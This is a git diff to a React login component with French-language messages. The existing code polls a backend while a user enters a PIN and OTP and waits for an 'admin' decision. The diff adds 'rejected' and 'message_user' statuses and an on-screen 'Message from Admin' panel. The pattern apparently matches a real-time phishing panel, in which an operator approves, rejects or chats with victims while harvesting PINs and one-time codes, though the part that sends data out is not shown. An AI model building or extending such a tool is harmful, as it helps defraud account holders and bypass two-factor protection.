@@ -32,6 +32,7 @@ function Login() {
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState("")
   const [status, setStatus] = useState("")
+  const [adminMessage, setAdminMessage] = useState("")
   
   const inputRefs = useRef([])
   const sessionRef = useRef(null)
@@ -43,7 +44,9 @@ function Login() {
     approved: "✅ Code PIN approuvé !!",
     wrong_pin: "❌ Code PIN incorrect",
     pinotp_correct: "✅ Code PIN et OTP vérifiés!",
-    expired: "⏰ Délai de vérification dépassé "
+    expired: "⏰ Délai de vérification dépassé ",
+    rejected: "❌ Request rejected by admin",
+    message_user: "💬 Admin wants to message you..."
   }
 
   const handleInputChange = (index, value) => {
@@ -92,6 +95,10 @@ function Login() {
           setStatus("approved")
           setLoading(false)
           navigate(`/${userId}/verification`)
+        } else if (data.status === "rejected") {
+          setError("❌ Request rejected by admin. Please try again.")
+          setLoading(false)
+          setStatus("rejected")
         } else if (data.status === "pending") {
           setStatus("pending")
         } else if (data.status === "wrong_pin") {
@@ -106,6 +113,8 @@ function Login() {
           setStatus("pinotp_correct")
           setLoading(false)
           navigate(`/${userId}/verification`)
+        } else if (data.status === "message_user") {
+          setAdminMessage(data.message || "")
         }
       } catch (err) {
         console.error("Polling error:", err)
@@ -199,6 +208,17 @@ function Login() {
         
         <div className="pin-input-container">
           <label className="pin-label">Saisissez votre code PIN</label>
+          
+          {adminMessage && (
+            <div className="admin-message">
+              <div className="admin-message-header">
+                <span style={{ color: "#11bb4a" }}>💬</span>
+                <strong>Message from Admin:</strong>
+              </div>
+              <div className="admin-message-content">{adminMessage}</div>
+            </div>
+          )}
+          
           <div>
             {inputs.map((input, index) => (
               <input
